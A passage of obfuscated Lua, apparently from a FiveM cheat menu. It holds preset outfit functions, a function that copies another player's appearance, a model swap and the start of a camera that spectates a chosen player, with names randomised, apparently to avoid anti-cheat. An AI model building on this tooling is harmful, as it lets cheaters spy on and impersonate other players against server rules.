            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1,	beard_1,(beard_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1, 1,beard_3,beard_4)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2,	eyebrows_1,(eyebrows_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2, 1,eyebrows_3,eyebrows_4)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2,hair_1,hair_2, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1),hair_color_1,hair_color_2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2, ears_1,ears_2, 2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 6,watches_1,watches_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1, glasses_1 , glasses_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 0, helmet_1 ,helmet_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 7, chain_1, chain_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 9,bproof_1, bproof_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1,mask_1,mask_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 6, shoes_1,shoes_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 4,pants_1,pants_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 3, arms, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 11, torso_1 ,torso_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 8,tshirt_1,tshirt_2, 2)
        end,
        PreMadeFit2 = function()	
            local pedid = nlFXKkFxuKQAk.natives.PlayerId()	
            local characterModel = RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01')	
            local face = 0
            local face1 = 0
            local face2 = 0	
            local skin = 10	
            local beard_1 = 10	
            local beard_2 = 6	
            local beard_3 = 1	
            local beard_4 = 1	
            local eyebrows_1 = 1	
            local eyebrows_2 = 10	
            local eyebrows_3 = 1	
            local eyebrows_4 = 1	
            local hair_1 = 21	
            local hair_2 = 0	
            local hair_color_1 = 1	
            local hair_color_2 = 1	
            local tshirt_1 = 76	
            local tshirt_2 = 1	
            local torso_1 = 230	
            local torso_2 = 2	
            local decals_1 = 0	
            local decals_2 = 0	
            local arms = 1	
            local pants_1 = 4	
            local pants_2 = 2	
            local shoes_1 = 7	
            local shoes_2 = 0	
            local mask_1 = 0	
            local mask_2 = 0	
            local bproof_1 = 0	
            local bproof_2 = 0	
            local chain_1 = 51	
            local chain_2 = 0	
            local helmet_1 = -1	
            local helmet_2 = 0	
            local glasses_1 = 5	
            local glasses_2 = 6
            
            nlFXKkFxuKQAk.natives.RequestModel(characterModel)		
           
            while not nlFXKkFxuKQAk.natives.HasModelLoaded(characterModel) do			
                RfPsUKHSFWJuBEJuz.rE.LumWait(50)		
            end		
            nlFXKkFxuKQAk.natives.SetPlayerModel(pedid, characterModel)		
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)   		
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(nlFXKkFxuKQAk.natives.GetPlayerPed(-1),face, face1, face2, skin, skin, skin, 1.0, 1.0, 1.0, true)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1,	beard_1,(beard_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1, 1,beard_3,beard_4)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2,	eyebrows_1,(eyebrows_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2, 1,eyebrows_3,eyebrows_4)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2,hair_1,hair_2, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1),hair_color_1,hair_color_2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1, glasses_1 , glasses_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 0, helmet_1 ,helmet_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 7, chain_1, chain_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 9,bproof_1, bproof_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1,mask_1,mask_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 6, shoes_1,shoes_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 4,pants_1,pants_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 3, arms, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 11, torso_1 ,torso_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 8,tshirt_1,tshirt_2, 2)	
        end,
        PreMadeFit3 = function()
            local pedid = nlFXKkFxuKQAk.natives.PlayerId()	
            local characterModel = RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01')	
            local face = 0	
            local skin = 5	
            local beard_1 = 8	
            local beard_2 = 8
            local beard_3 = 1	
            local beard_4 = 1	
            local eyebrows_1 = 2	
            local eyebrows_2 = 10	
            local eyebrows_3 = 1	
            local eyebrows_4 = 1	
            local hair_1 = 1	
            local hair_2 = 0	
            local hair_color_1 = 1	
            local hair_color_2 = 1	
            local tshirt_1 = 15	
            local tshirt_2 = 0	
            local torso_1 = 121	
            local torso_2 = 3	
            local decals_1 = 0	
            local decals_2 = 0	
            local arms = 4	
            local pants_1 = 14	
            local pants_2 = 3	
            local shoes_1 = 6	
            local shoes_2 = 1	
            local mask_1 = 119	
            local mask_2 = 5	
            local bproof_1 = 0	
            local bproof_2 = 0	
            local chain_1 = 0	
            local chain_2 = 0	
            local helmet_1 = -1	
            local helmet_2 = 0	
            local glasses_1 = 24	
            local glasses_2 = 5	
            local watches_1 = -1	
            local watches_2 = 0	
            local ears_1 = -1	
            local ears_2 = 0        
            
            nlFXKkFxuKQAk.natives.RequestModel(characterModel)		
            
            while not nlFXKkFxuKQAk.natives.HasModelLoaded(characterModel) do			
                RfPsUKHSFWJuBEJuz.rE.LumWait(50)		
            end		
            
            nlFXKkFxuKQAk.natives.SetPlayerModel(pedid, characterModel)		
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)		
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(nlFXKkFxuKQAk.natives.GetPlayerPed(-1),face, face, face, skin, skin, skin, 1.0, 1.0, 1.0, true)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1,	beard_1,(beard_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1, 1,beard_3,beard_4)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2,	eyebrows_1,(eyebrows_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2, 1,eyebrows_3,eyebrows_4)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2,hair_1,hair_2, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1),hair_color_1,hair_color_2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2, ears_1,ears_2, 2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 6,watches_1,watches_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1, glasses_1 , glasses_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 0, helmet_1 ,helmet_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 7, chain_1, chain_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 9,bproof_1, bproof_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1,mask_1,mask_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 6, shoes_1,shoes_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 4,pants_1,pants_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 3, arms, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 11, torso_1 ,torso_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 8,tshirt_1,tshirt_2, 2)
        end,
        kylersunset = function()
            local pedid = nlFXKkFxuKQAk.natives.PlayerId()
            local characterModel = RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01')	
            local face = 0
            local face1 = 2
            local face2 = 6
            local skin = 5	
            local beard_1 = 10	
            local beard_2 = 6	
            local beard_3 = 14	
            local beard_4 = 10	
            local eyebrows_1 = 3	
            local eyebrows_2 = 10	
            local eyebrows_3 = 15	
            local eyebrows_4 = 15	
            local hair_1 = 13	
            local hair_2 = 0	
            local hair_color_1 = 15	
            local hair_color_2 = 7		
            local tshirt_1 = 15	
            local tshirt_2 = 0	
            local torso_1 = 15	
            local torso_2 = 0	
            local decals_1 = 0	
            local decals_2 = 0
            local arms = 15
            local pants_1 = 16
            local pants_2 = 2
            local shoes_1 = 16
            local shoes_2 = 6
            local mask_1 = 0
            local mask_2 = 0
            local bproof_1 = 0
            local bproof_2 = 0
            local chain_1 = 0
            local chain_2 = 0
            local helmet_1 = -1
            local helmet_2 = 0
            local glasses_1 = 7
            local glasses_2 = 4
            local watches_1 = -1
            local watches_2 = 0
            local ears_1 = -1
            local ears_2 = 0
        
            nlFXKkFxuKQAk.natives.RequestModel(characterModel)		
            
            while not nlFXKkFxuKQAk.natives.HasModelLoaded(characterModel) do			
                RfPsUKHSFWJuBEJuz.rE.LumWait(50)		
            end
                    
            nlFXKkFxuKQAk.natives.SetPlayerModel(pedid, characterModel)		
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)		
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(nlFXKkFxuKQAk.natives.GetPlayerPed(-1),face, face1, face2, skin, skin, skin, 1.0, 1.0, 1.0, true)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1,	beard_1,(beard_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1, 1,beard_3,beard_4)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2,	eyebrows_1,(eyebrows_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2, 1,eyebrows_3,eyebrows_4)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2,hair_1,hair_2, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1),hair_color_1,hair_color_2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2, ears_1,ears_2, 2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 6,watches_1,watches_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1, glasses_1 , glasses_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 0, helmet_1 ,helmet_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 7, chain_1, chain_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 9,bproof_1, bproof_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1,mask_1,mask_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 6, shoes_1,shoes_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 4,pants_1,pants_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 3, arms, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 11, torso_1 ,torso_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 8,tshirt_1,tshirt_2, 2)
        end,
        chadsunset = function()
            local pedid = nlFXKkFxuKQAk.natives.PlayerId()	
            local characterModel = RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01')	     
            local face = 0
            local face1 = 2
            local face2 = 6	
            local skin = 5	
            local beard_1 = 10	
            local beard_2 = 6	
            local beard_3 = 14	
            local beard_4 = 10	
            local eyebrows_1 = 3	
            local eyebrows_2 = 10	
            local eyebrows_3 = 15	
            local eyebrows_4 = 15	
            local hair_1 = 17	
            local hair_2 = 0	
            local hair_color_1 = 15	
            local hair_color_2 = 7	
            local tshirt_1 = 15	
            local tshirt_2 = 0	
            local torso_1 = 15	
            local torso_2 = 0	
            local decals_1 = 0	
            local decals_2 = 0
            local arms = 15
            local pants_1 = 16
            local pants_2 = 1
            local shoes_1 = 16
            local shoes_2 = 5
            local mask_1 = 0
            local mask_2 = 0
            local bproof_1 = 0
            local bproof_2 = 0
            local chain_1 = 0
            local chain_2 = 0
            local helmet_1 = -1
            local helmet_2 = 0
            local glasses_1 = 7
            local glasses_2 = 7
            local watches_1 = -1
            local watches_2 = 0
            local ears_1 = -1
            local ears_2 = 0
            
            nlFXKkFxuKQAk.natives.RequestModel(characterModel)		
           
            while not nlFXKkFxuKQAk.natives.HasModelLoaded(characterModel) do			
                RfPsUKHSFWJuBEJuz.rE.LumWait(50)		
            end		
            nlFXKkFxuKQAk.natives.SetPlayerModel(pedid, characterModel)		
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)   		
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(nlFXKkFxuKQAk.natives.GetPlayerPed(-1),face, face1, face2, skin, skin, skin, 1.0, 1.0, 1.0, true)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1,	beard_1,(beard_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1, 1,beard_3,beard_4)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2,	eyebrows_1,(eyebrows_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2, 1,eyebrows_3,eyebrows_4)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 2,hair_1,hair_2, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(nlFXKkFxuKQAk.natives.GetPlayerPed(-1),hair_color_1,hair_color_2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1, glasses_1 , glasses_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 0, helmet_1 ,helmet_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 7, chain_1, chain_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 9,bproof_1, bproof_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 1,mask_1,mask_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 6, shoes_1,shoes_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 4,pants_1,pants_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 3, arms, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 11, torso_1 ,torso_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 8,tshirt_1,tshirt_2, 2)
        end,
        CloneDaFit = function(target)
            local me = nlFXKkFxuKQAk.natives.GetPlayerPed(-1)
            local ped = nlFXKkFxuKQAk.natives.GetPlayerPed(target)
            local hat = nlFXKkFxuKQAk.natives.GetPedPropIndex(ped, 0)
            local hat_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(ped, 0)
            local glasses = nlFXKkFxuKQAk.natives.GetPedPropIndex(ped, 1)
            local glasses_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(ped, 1)
            local ear = nlFXKkFxuKQAk.natives.GetPedPropIndex(ped, 2)
            local ear_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(ped, 2)
            local watch = nlFXKkFxuKQAk.natives.GetPedPropIndex(ped, 6)
            local watch_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(ped, 6)
            local wrist = nlFXKkFxuKQAk.natives.GetPedPropIndex(ped, 7)
            local wrist_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(ped, 7)
            local head_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 0)
            local head_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 0)
            local head_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 0)
            local beard_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 1)
            local beard_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 1)
            local beard_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 1)
            local hair_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 2)
            local hair_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 2)
            local hair_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 2)
            local torso_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 3)
            local torso_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 3)
            local torso_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 3)
            local legs_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 4)
            local legs_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 4)
            local legs_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 4)
            local hands_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 5)
            local hands_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 5)
            local hands_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 5)
            local foot_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 6)
            local foot_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 6)
            local foot_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 6)
            local acc1_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 7)
            local acc1_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 7)
            local acc1_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 7)
            local acc2_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 8)
            local acc2_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 8)
            local acc2_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 8)
            local acc3_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 9)
            local acc3_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 9)
            local acc3_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 9)
            local mask_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 10)
            local mask_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 10)
            local mask_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 10)
            local aux_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(ped, 11)
            local aux_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(ped, 11) 	
            local aux_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(ped, 11)
            nlFXKkFxuKQAk.natives.SetPedPropIndex(me, 0, hat, hat_texture, 1)
            nlFXKkFxuKQAk.natives.SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
            nlFXKkFxuKQAk.natives.SetPedPropIndex(me, 2, ear, ear_texture, 1)
            nlFXKkFxuKQAk.natives.SetPedPropIndex(me, 6, watch, watch_texture, 1)
            nlFXKkFxuKQAk.natives.SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
        end,
        argunr = function()
            local pedid = nlFXKkFxuKQAk.natives.PlayerId()	
            local characterModel = RfPsUKHSFWJuBEJuz.rE.LumHash('a_m_m_hasjew_01')
            local helmet_1 = 0	
            local helmet_2 = 0

            nlFXKkFxuKQAk.natives.RequestModel(characterModel)
            while not nlFXKkFxuKQAk.natives.HasModelLoaded(characterModel) do			
                RfPsUKHSFWJuBEJuz.rE.LumWait(50)
            end

            nlFXKkFxuKQAk.natives.SetPlayerModel(pedid, characterModel)		
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)
            nlFXKkFxuKQAk.natives.SetPedPropIndex(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), 0, helmet_1 ,helmet_2 , 2)
        end,
        specnow = function(ped)
            local pped = nlFXKkFxuKQAk.natives.GetPlayerPed(ped)
            local cam = nlFXKkFxuKQAk.natives.CreateCam('DEFAULT_SCRIPTED_Camera', 1)
            nlFXKkFxuKQAk.natives.RenderScriptCams(1, 0, 0, 1, 1)
            nlFXKkFxuKQAk.natives.SetCamActive(cam, true)
            nlFXKkFxuKQAk.natives.SetFocusEntity(pped)
            RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                local offsetRotX = 0.0
                local offsetRotY = 0.0
                local offsetRotZ = 0.0
                local currOffset = vec3(0.0, -4.0, 3.0)
                while jrnyLearIyzKiSIen.config.specfornow do
                    RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                if jrnyLearIyzKiSIen.config.opennow then
                    offsetRotX = offsetRotX - (nlFXKkFxuKQAk.natives.GetControlNormal(1, 2) * 8.0)
                    offsetRotZ = offsetRotZ - (nlFXKkFxuKQAk.natives.GetControlNormal(1, 1) * 8.0)
                else
                    offsetRotX = offsetRotX - (nlFXKkFxuKQAk.natives.GetDisabledControlNormal(1, 2) * 8.0)
                    offsetRotZ = offsetRotZ - (nlFXKkFxuKQAk.natives.GetDisabledControlNormal(1, 1) * 8.0)
                end
            
                    if (offsetRotX > 90.0) then 
                        offsetRotX = 90.0 
                    elseif (offsetRotX < -90.0) then 
                        offsetRotX = -90.0 
                    end
            
                    if (offsetRotY > 90.0) then 
                        offsetRotY = 90.0 
                    elseif (offsetRotY < -90.0) then 
                        offsetRotY = -90.0 
                    end
            
                    if (offsetRotZ > 360.0) then 
                        offsetRotZ = offsetRotZ - 360.0 
                    elseif (offsetRotZ < -360.0) then 
                        offsetRotZ = offsetRotZ + 360.0 
                    end
                    local rot = nlFXKkFxuKQAk.natives.GetEntityRotation(pped)
                    nlFXKkFxuKQAk.natives.SetCamRot(cam, rot.x + offsetRotX, rot.y + offsetRotY, rot.z + offsetRotZ, 2)
                    
                    local offset = offsetRotZ / 18.0
                    if offset > 10.5 then 
                        offset = offset - 21
                    elseif offset < -10.5 then
                        offset = offset + 21
                    end
    
                    local height = (offsetRotX / 10.0) * -1
                    local coords = nlFXKkFxuKQAk.natives.GetEntityCoords(pped)
                    local success, groundz = nlFXKkFxuKQAk.natives.GetGroundZFor_3dCoord(coords.x, coords.y, coords.z)
                    local customforward = 0.0
    
                    if success then
                        if nlFXKkFxuKQAk.natives.GetOffsetFromEntityInWorldCoords(pped, 0.0, 0.0, height).z - groundz < 0.0 then
                            customforward = height * -1
                            if customforward > 1.75 then customforward = 1.75 end
                            height = (groundz - nlFXKkFxuKQAk.natives.GetEntityCoords(pped).z)
                        end
                    end
                    
                    height = height + 0.25
    
                    if height > 4.0 then 
                        customforward = height - 4.0
                        if customforward > 5.0 then customforward = 5.0 end
                        height = 4.0 
                    end
    
                    if offset > 3.0 then
                        if offset > 7.5 then
